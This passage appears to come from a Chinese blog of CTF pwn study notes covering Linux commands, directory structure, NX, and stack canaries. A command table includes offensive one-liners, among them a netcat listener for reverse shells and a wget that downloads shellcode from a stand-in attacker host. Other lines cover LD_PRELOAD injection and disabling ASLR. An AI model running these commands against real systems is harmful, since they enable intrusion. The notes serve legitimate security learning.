-R</code></td><td>递归列出当前目录及所有子目录的文件（遍历嵌套目录 ）</td></tr><tr><td><strong>个人常用 <code>ls</code> 用法</strong></td><td><code>ll -ah</code> （长格式 + 显示隐藏文件 + 人性化字节数 ）</td></tr><tr><td><strong><code>mkdir</code></strong></td><td>创建目录；<code>-p</code> 选项可级联创建多层目录（如 <code>mkdir -p a/b/c</code> ）</td></tr><tr><td><strong><code>rmdir</code></strong></td><td>删除空目录；非空目录需用 <code>rm -rf 目录名</code> 强制删除（谨慎使用 <code>rm -rf</code> ）</td></tr><tr><td><strong><code>du</code> 命令及选项</strong></td><td></td></tr><tr><td><code>du</code></td><td>统计目录 &#x2F; 文件的磁盘占用字节数</td></tr><tr><td><code>du -s</code></td><td>只显示总字节数（不展开子文件 &#x2F; 目录 ）</td></tr><tr><td><code>du -h</code></td><td>字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><strong>个人常用 <code>du</code> 用法</strong></td><td><code>du -sh</code> （统计总占用 + 人性化字节数 ）</td></tr></tbody></table><h2 id="文件操作命令-which、touch、cp、mv、rm、file"><a href="#文件操作命令-which、touch、cp、mv、rm、file" class="headerlink" title="文件操作命令 which、touch、cp、mv、rm、file"></a>文件操作命令 which、touch、cp、mv、rm、file</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>功能说明</strong></th><th><strong>语法示例</strong></th><th><strong>关键参数 &#x2F; 补充</strong></th></tr></thead><tbody><tr><td><code>which</code></td><td>查找命令在系统中的绝对路径</td><td><code>which cd</code> <code>which ls</code> <code>which date</code></td><td>- 仅查系统 <code>PATH</code> 路径内的可执行命令</td></tr><tr><td><code>touch</code></td><td>创建空文件 &#x2F; 更新文件修改时间</td><td><code>touch /root/aaa /root/bbb /root/ccc</code></td><td>- 无文件则创建，有文件则改<strong>修改时间</strong></td></tr><tr><td><code>cp</code></td><td>复制文件 &#x2F; 目录</td><td>复制文件： <code>cp /root/install.log /tmp</code> <code>cp /root/install.log /tmp/abc.log</code> 复制目录： <code>cp -R /root /tmp</code> <code>cp -R /root /tmp/abc</code></td><td><code>-R</code>：递归复制目录（必加） <code>-i</code>：覆盖前提示（默认隐藏，需手动开）</td></tr><tr><td><code>mv</code></td><td>移动文件 &#x2F; 目录 &#x2F; 重命名</td><td>移动： <code>mv /root/install.log.bak /tmp</code> 重命名： <code>mv /tmp/root /tmp/root1</code></td><td>- 移动 + 重命名可一步完成（如 <code>mv 旧路径 新路径</code> ）</td></tr><tr><td><code>rm</code></td><td>删除文件 &#x2F; 目录（<strong>危险操作</strong>）</td><td>删除文件： <code>rm /root/install.log.bak</code> 删除目录： <code>rm -rf /tmp/root1</code></td><td><code>-r</code>：递归删目录内容 <code>-f</code>：强制删除（无提示） <code>-i</code>：删除前逐一确认（建议日常用）</td></tr><tr><td><code>file</code></td><td>查看文件的类型（格式 &#x2F; 编码等）</td><td><code>file 文件名</code> 例：<code>file /root/install.log</code></td><td>- 可识别文本、二进制、压缩包等类型</td></tr></tbody></table><h2 id="查看登录用户命名-who、w"><a href="#查看登录用户命名-who、w" class="headerlink" title="查看登录用户命名 who、w"></a>查看登录用户命名 who、w</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>who</strong></td><td><strong>当前用户登录的信息</strong></td></tr><tr><td><strong>w</strong></td><td><strong>当前用户登录的信息，以什么程序登录的</strong></td></tr></tbody></table><h2 id="文件内容查看命令-cat、tac、more、less、tail、head"><a href="#文件内容查看命令-cat、tac、more、less、tail、head" class="headerlink" title="文件内容查看命令 cat、tac、more、less、tail、head"></a>文件内容查看命令 cat、tac、more、less、tail、head</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>cat</td><td>查看文本文件内容，将文本文件内容全部打印到标准输出 选项 -n 输出结果带行号</td></tr><tr><td>tac</td><td>查看文本文件内容，倒序输出 按照行号倒序打印文本文件的内容</td></tr><tr><td>more</td><td>分页显示文件内容，例如：more &#x2F;root&#x2F;install.log 默认显示进度百分比 空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>less</td><td>分页显示文件内容，例如：less &#x2F;root&#x2F;install.log 选项 -m 显示进度百分比 可以用“&#x2F;”后跟关键字搜索文件内容 空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>tail</td><td>查看文件尾部10行，例如：tail &#x2F;root&#x2F;install.log 选项-N （N为正整数）可以指定显示末尾N行内容</td></tr><tr><td>head</td><td>查看文件头部10行，例如：head &#x2F;root&#x2F;install.log 选项-N （N为正整数）可以指定显示头部N行内容</td></tr></tbody></table><h2 id="系统管理类命令-shutdown、reboot、lscpu"><a href="#系统管理类命令-shutdown、reboot、lscpu" class="headerlink" title="系统管理类命令 shutdown、reboot、lscpu"></a>系统管理类命令 shutdown、reboot、lscpu</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>shutdown</strong></td><td><strong>关机命令</strong> <strong>shutdown -h now 立刻关机</strong> <strong>shutdown -h +10 “10分钟后关机”，每个登录用户收到“10分钟后关机”的消息，并于10分钟后关机</strong> <strong>shutdown -c 取消关机</strong></td></tr><tr><td><strong>reboot</strong></td><td><strong>重启系统</strong></td></tr><tr><td><strong>lscpu</strong></td><td><strong>查看系统cpu信息</strong></td></tr></tbody></table><h1 id="查阅命令帮助信息"><a href="#查阅命令帮助信息" class="headerlink" title="查阅命令帮助信息"></a>查阅命令帮助信息</h1><h2 id="help"><a href="#help" class="headerlink" title="-help"></a>-help</h2><p>说明：显示 command 命令的帮助信息</p><h2 id="man"><a href="#man" class="headerlink" title="-man"></a>-man</h2><p>说明：</p><p>·查阅 command 命令的使用手册（man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用）<br>·说明：使用 man 时的操作键</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>&#x2F;word</td><td>搜索 word 字符串</td></tr></tbody></table><h1 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全:"></a>自动补全:</h1><p>在敲出 文件 ／ 目录 ／ 命令 的前几个字母之后，按下 tab 键</p><p>如果输入的没有歧义，系统会自动补全<br>如果还存在其他 文件 ／ 目录 ／ 命令 ，再按一下 tab 键，系统会提示可能存在的命令<br>小技巧</p><p><strong><code>小技巧：</code></strong></p><p>ctrl + shift + &#x3D; 放大终端窗口的字体显示<br>ctrl + - 缩小终端窗口的字体显示</p><p>按 上 ／ 下 光标键可以在曾经使用过的命令之间来回切换<br>如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="文件分析命令（关键！）"><a href="#文件分析命令（关键！）" class="headerlink" title="文件分析命令（关键！）"></a>文件分析命令（关键！）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>file</code></strong></td><td>查看文件类型</td><td><code>file ./vuln</code></td><td>识别ELF类型（32&#x2F;64位）、动态&#x2F;静态链接</td></tr><tr><td><strong><code>checksec</code></strong></td><td>检查安全机制</td><td><code>checksec --file=./vuln</code></td><td>查看NX, PIE, Canary, RELRO等防护状态</td></tr><tr><td><strong><code>readelf</code></strong></td><td>ELF文件分析</td><td><code>readelf -a ./vuln</code></td><td>查看节头、符号表、重定位表、程序头</td></tr><tr><td><code>readelf -S</code></td><td>查看节头信息</td><td><code>readelf -S ./vuln</code></td><td>定位.text&#x2F;.plt&#x2F;.got等关键段地址</td></tr><tr><td><code>readelf -s</code></td><td>查看符号表</td><td>&#96;readelf -s .&#x2F;vuln</td><td>grep system&#96;</td></tr><tr><td><strong><code>objdump</code></strong></td><td>反汇编分析</td><td><code>objdump -d ./vuln</code></td><td>反汇编代码段</td></tr><tr><td><code>objdump -M</code></td><td>指定反汇编格式</td><td><code>objdump -M intel -d ./vuln</code></td><td>Intel格式反汇编（更易读）</td></tr><tr><td><code>objdump -j</code></td><td>反汇编特定段</td><td><code>objdump -j .plt -d ./vuln</code></td><td>分析PLT表</td></tr><tr><td><strong><code>strings</code></strong></td><td>提取字符串</td><td>&#96;strings .&#x2F;vuln</td><td>grep “&#x2F;bin&#x2F;sh”&#96;</td></tr><tr><td><strong><code>ldd</code></strong></td><td>查看动态依赖</td><td><code>ldd ./vuln</code></td><td>获取libc路径和基址偏移</td></tr></tbody></table><h2 id="调试分析命令（核心工具）"><a href="#调试分析命令（核心工具）" class="headerlink" title="调试分析命令（核心工具）"></a>调试分析命令（核心工具）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>gdb</code></strong></td><td>GNU调试器</td><td><code>gdb ./vuln</code></td><td>动态调试分析</td></tr><tr><td><code>gdb -p</code></td><td>附加进程</td><td><code>gdb -p &lt;pid&gt;</code></td><td>调试运行中的程序</td></tr><tr><td><code>gdb -ex</code></td><td>执行命令</td><td><code>gdb -ex &quot;b main&quot; -ex &quot;r&quot; ./vuln</code></td><td>自动化调试任务</td></tr><tr><td><strong><code>strace</code></strong></td><td>系统调用跟踪</td><td><code>strace ./vuln</code></td><td>监控系统调用（如execve）</td></tr><tr><td><strong><code>ltrace</code></strong></td><td>库函数跟踪</td><td><code>ltrace ./vuln</code></td><td>监控库函数调用（如malloc）</td></tr><tr><td><strong><code>pwndbg</code></strong></td><td>增强版GDB</td><td>-</td><td>专为Pwn设计的GDB插件</td></tr><tr><td><code>info proc</code></td><td>查看进程信息</td><td><code>info proc mappings</code></td><td>查看内存映射布局</td></tr></tbody></table><h2 id="网络操作命令（漏洞利用必备）"><a href="#网络操作命令（漏洞利用必备）" class="headerlink" title="网络操作命令（漏洞利用必备）"></a>网络操作命令（漏洞利用必备）</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>nc</code></strong></td><td>网络工具</td><td><code>nc -lvp 4444</code></td><td>监听端口（接收反弹shell）</td></tr><tr><td></td><td></td><td><code>nc 192.168.1.100 1337</code></td><td>连接远程漏洞服务</td></tr><tr><td><strong><code>socat</code></strong></td><td>高级网络工具</td><td><code>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./vuln</code></td><td>稳定连接（用于ROP链开发）</td></tr><tr><td><strong><code>curl</code></strong></td><td>HTTP客户端</td><td><code>curl http://target:8080/exploit</code></td><td>Web Pwn题利用</td></tr><tr><td><strong><code>wget</code></strong></td><td>文件下载</td><td><code>wget http://attacker.com/shellcode.bin</code></td><td>下载远程payload</td></tr></tbody></table><h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>ps</code></strong></td><td>查看进程</td><td>&#96;ps aux</td><td>grep vuln&#96;</td></tr><tr><td><strong><code>kill</code></strong></td><td>终止进程</td><td><code>kill -9 &lt;pid&gt;</code></td><td>强制结束崩溃的程序</td></tr><tr><td><strong><code>pkill</code></strong></td><td>按名杀进程</td><td><code>pkill -f vuln</code></td><td>快速结束目标程序</td></tr><tr><td><strong><code>top</code></strong></td><td>实时进程监控</td><td><code>top</code></td><td>监控资源占用情况</td></tr><tr><td><strong><code>nohup</code></strong></td><td>后台运行</td><td><code>nohup ./vuln &amp;</code></td><td>保持服务运行</td></tr></tbody></table><h2 id="环境配置命令"><a href="#环境配置命令" class="headerlink" title="环境配置命令"></a>环境配置命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>export</code></strong></td><td>环境变量</td><td><code>export LD_PRELOAD=./libc.so.6</code></td><td>预加载库（库注入攻击）</td></tr><tr><td></td><td></td><td><code>export PYTHONPATH=/path/to/pwntools</code></td><td>设置Python路径</td></tr><tr><td><strong><code>ulimit</code></strong></td><td>资源限制</td><td><code>ulimit -c unlimited</code></td><td>启用core dump</td></tr><tr><td><strong><code>setarch</code></strong></td><td>设置架构</td><td><code>setarch </code>uname -m<code> -R ./vuln</code></td><td>禁用ASLR（地址随机化）</td></tr><tr><td><strong><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></strong></td><td>全局禁用ASLR</td><td>需要root权限</td><td>调试环境配置</td></tr></tbody></table><h2 id="二进制处理命令"><a href="#二进制处理命令" class="headerlink" title="二进制处理命令"></a>二进制处理命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>xxd</code></strong></td><td>十六进制查看</td><td>&#96;xxd .&#x2F;vuln</td><td>head&#96;</td></tr><tr><td><strong><code>hexedit</code></strong></td><td>十六进制编辑</td><td><code>hexedit ./vuln</code></td><td>手动修改二进制文件</td></tr><tr><td><strong><code>patchelf</code></strong></td><td>ELF修补</td><td><code>patchelf --set-interpreter /lib/ld-linux.so.2 ./vuln</code></td><td>修改动态链接器</td></tr><tr><td></td><td></td><td><code>patchelf --replace-needed libc.so.6 ./libc_target.so ./vuln</code></td><td>替换依赖库</td></tr><tr><td><strong><code>objcopy</code></strong></td><td>目标文件操作</td><td><code>objcopy --dump-section .text=text.bin ./vuln</code></td><td>提取代码段</td></tr></tbody></table><h2 id="开发辅助命令"><a href="#开发辅助命令" class="headerlink" title="开发辅助命令"></a>开发辅助命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>python</code></strong></td><td>Python解释器</td><td><code>python3 exploit.py</code></td><td>运行漏洞利用脚本</td></tr><tr><td><strong><code>pip</code></strong></td><td>Python包管理</td><td><code>pip install pwntools</code></td><td>安装Pwn工具库</td></tr><tr><td><strong><code>gcc</code></strong></td><td>编译器</td><td><code>gcc -fno-stack-protector -z execstack vuln.c -o vuln</code></td><td>编译含漏洞程序</td></tr><tr><td><strong><code>make</code></strong></td><td>构建工具</td><td><code>make</code></td><td>编译CTF题目</td></tr><tr><td><strong><code>tmux</code></strong></td><td>终端复用器</td><td><code>tmux new -s pwn</code></td><td>管理多个调试窗口</td></tr></tbody></table><h2 id="信息搜索命令"><a href="#信息搜索命令" class="headerlink" title="信息搜索命令"></a>信息搜索命令</h2><table><thead><tr><th>命令</th><th>功能</th><th>参数示例</th><th>Pwn应用场景</th></tr></thead><tbody><tr><td><strong><code>grep</code></strong></td><td>文本搜索</td><td>&#96;objdump -d .&#x2F;vuln</td><td>grep “call”&#96;</td></tr><tr><td><strong><code>find</code></strong></td><td>文件查找</td><td><code>find / -name &quot;libc.so.6&quot; 2&gt;/dev/null</code></td><td>查找libc库</td></tr><tr><td><strong><code>which</code></strong></td><td>命令定位</td><td><code>which gdb</code></td><td>查找工具路径</td></tr><tr><td><strong><code>man</code></strong></td><td>手册查看</td><td><code>man 2 execve</code></td><td>查看系统调用文档</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-Linux安全机制 </category>
          
          <category> 1-Linux基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux目录结构</title>
      <link href="/2025/07/b5cdfe52dd80.html"/>
      <url>/2025/07/b5cdfe52dd80.html</url>
      
        <content type="html"><![CDATA[<h1 id="根目录的子目录"><a href="#根目录的子目录" class="headerlink" title="根目录的子目录"></a>根目录的子目录</h1><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>bin是Binary的缩写, 这个目录存放着最经常使用的命令，由系统、系统管理员和用户共享</td></tr><tr><td>&#x2F;boot</td><td>这里存放的是启动Linux时使用的一些核心文件，包括一些链接文件以及镜像文件</td></tr><tr><td>&#x2F;dev</td><td>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的</td></tr><tr><td>&#x2F;etc</td><td>大多数重要的系统配置文件都在&#x2F;etc目录下，该目录包含的数据类似于Windows控制面板中的数据</td></tr><tr><td>&#x2F;home</td><td>普通用户的家目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</td></tr><tr><td>&#x2F;lib</td><td>库文件，包括系统和用户所需要的各种程序的文件</td></tr><tr><td>&#x2F;lost+found</td><td>每个分区在其上目录中都有一个lost+found。故障期间保存的文件在这里</td></tr><tr><td>&#x2F;media</td><td>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下</td></tr><tr><td>&#x2F;mnt</td><td>外部文件系统的标准挂载点，例如CD-ROM(光驱)或数码相机</td></tr><tr><td>&#x2F;opt</td><td>通常包含额外的和第三方软件。这是给主机额外安装的大型应用程序所放置的目录</td></tr><tr><td>&#x2F;proc</td><td>包含有关系统资源信息的虚拟文件系统。这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件&lt;</td></tr><tr><td>&#x2F;root</td><td>该目录为系统管理员，也称作超级权限者的用户家目录。注意根目录 &#x2F; 和根用户的主目录 &#x2F;root 之间的区别</td></tr><tr><td>&#x2F;sbin</td><td>s就是Super User的意思，这里存放的是系统管理员root使用的系统管理程序</td></tr><tr><td>&#x2F;tmp</td><td>系统使用的临时空间，在重新启动时清理，所以不要使用它来保存任何工作!该目录对于所有用户都可以访问，不要把重要文件放置于该目录</td></tr><tr><td>&#x2F;usr</td><td>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与windows下的program files目录</td></tr><tr><td>&#x2F;var</td><td>用户创建的所有可变文件和临时文件的存储空间，如日志文件(一般是&#x2F;var&#x2F;log)、邮件队列、打印假脱机程序区、从Internet下载的文件的临时存储空间，或在刻录CD之前保存它的映像。</td></tr></tbody></table><h1 id="Linux绝对路径和相对路径"><a href="#Linux绝对路径和相对路径" class="headerlink" title="Linux绝对路径和相对路径"></a>Linux绝对路径和相对路径</h1><h2 id="绝对路径："><a href="#绝对路径：" class="headerlink" title="绝对路径："></a>绝对路径：</h2><p>以根目录“&#x2F;”开始的路径，表示从Linux目录结构的最顶点算起，特点是路径以“&#x2F;”开头</p><h2 id="相对路径："><a href="#相对路径：" class="headerlink" title="相对路径："></a>相对路径：</h2><p>不以根目录“&#x2F;”开始的路径，以当前目录作为起始点，特点是不以“&#x2F;”开头</p><p>每个目录下都有”.”和”..”2个目录：</p><p>一个点“ . ”代表当前目录，写全了“ .&#x2F; ”</p><p>二个点“ .. ”代表上一级目录，写全了“ ..&#x2F; ”</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-Linux安全机制 </category>
          
          <category> 1-Linux基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NX</title>
      <link href="/2025/07/a60a3429e0bc.html"/>
      <url>/2025/07/a60a3429e0bc.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p> No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。通常我们使用可执行空间保护(executable space protection)作为一个统称，来描述这种防止传统代码注入攻击的技术——攻击者将恶意代码注入正在运行的程序中，然后使用内存损坏漏洞将控制流重定向到该代码。实施这种保护的技术有多种名称，在 Windows上称为数据执行保护(DEP)，在Linux上则有 NX、WX、Pax和 Exec Shield 等。</p><p> NX的实现需要结合软件和硬件共同完成。首先在硬件层面，它利用处理器的NX位，对相应页表项中的第63位进行设置，设置为1表示内容不可执行，设置为0则表示内容可执行。一旦程序计数器(PC)被放到受保护的页面内，就会触发硬件层面的异常。其次，在软件层面，操作系统需要支持 NX，以便正确配置页表，但有时这会给自修改代码或者动态生成的代码(JT编译代码)带来一些问题，这在浏览器上很常见。这时，软件需要使用适当的API来分配内存，例如Wimdows上使用 VirtualProtect 或 VirtualAlloc,Linux上使用mprotect或者 mmap，这些 API 允许更改已分配页面的保护级别。</p><p> 在 Linux 中，当装载器将程序装载进内存空间后，将程序的.text节标记为可执行，而其余的数据段(.data、.bss等)以及栈、堆均为不可执行。因此，传统的通过修改GOT来执行shellcode 的方式不再可行。但NX这种保护并不能阻止攻击者通过代码重用来进行攻击(ret2libc)。</p><p> 如下所示，Ubuntu 中已经默认启用了NX。GNUSTACK段在禁用NX时权限为RWE，而开启<br>后权限仅为 RW，不可执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc zexecstack hello,c &amp;&amp; readelf -l a.out | grep-A1 GNU STACK # 禁用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-Linux安全机制 </category>
          
          <category> 3-No-execute </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Canary</title>
      <link href="/2025/07/627686b41f6e.html"/>
      <url>/2025/07/627686b41f6e.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护的目的。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="简单程序"><a href="#简单程序" class="headerlink" title="简单程序"></a>简单程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    char buf[10];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br><span class="line"># 无栈保护</span><br><span class="line">$ gcc -fno-stack-protector canary.c -o fno.out #gcc -fno-stack-protector -o no_canary canary.c</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./fno.out</span><br><span class="line">$ Segmentation fault (core dumped)</span><br><span class="line"># 基础/最强栈保护</span><br><span class="line">$ gcc -fstack-protector -o with_canary canary.c(gcc -fstack-protector-strong -o strong_canary canary.c) #gcc -fstack-protector canary.c -o f.out</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./f.out</span><br><span class="line">$ *** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">plaintext</span><br><span class="line"></span><br><span class="line"># 编译带canary保护的版本</span><br><span class="line">gcc -fstack-protector -o with_canary canary.c</span><br><span class="line"></span><br><span class="line"># 检查文件是否生成</span><br><span class="line">ls -l with_canary</span><br><span class="line">-rwxr-xr-x 1 ubuntu ubuntu 16024 Jun 30 16:13 with_canary</span><br><span class="line"></span><br><span class="line">gdb -q ./with_canary -ex &quot;disassemble main&quot; -ex &quot;q&quot;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   `0x0000000000001175 &lt;+12&gt;:mov    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x000000000000117e &lt;+21&gt;:mov    QWORD PTR [rbp-0x8],rax`</span><br><span class="line">   0x0000000000001182 &lt;+25&gt;:xor    eax,eax</span><br><span class="line">   0x0000000000001184 &lt;+27&gt;:lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000001188 &lt;+31&gt;:mov    rsi,rax</span><br><span class="line">   0x000000000000118b &lt;+34&gt;:lea    rax,[rip+0xe72]        # 0x2004</span><br><span class="line">   0x0000000000001192 &lt;+41&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000000119a &lt;+49&gt;:call   0x1070 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:nop</span><br><span class="line">   `0x00000000000011a0 &lt;+55&gt;:mov    rax,QWORD PTR [rbp-0x8]`</span><br><span class="line">   `0x00000000000011a4 &lt;+59&gt;:sub    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x00000000000011ad &lt;+68&gt;:je     0x11b4 &lt;main+75&gt;`</span><br><span class="line">   `0x00000000000011af &lt;+70&gt;:call   0x1060 &lt;__stack_chk_fail@plt&gt;`</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:leave</span><br><span class="line">   0x00000000000011b5 &lt;+76&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h2><p>开启 Canary 保护的 stack 结构大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; 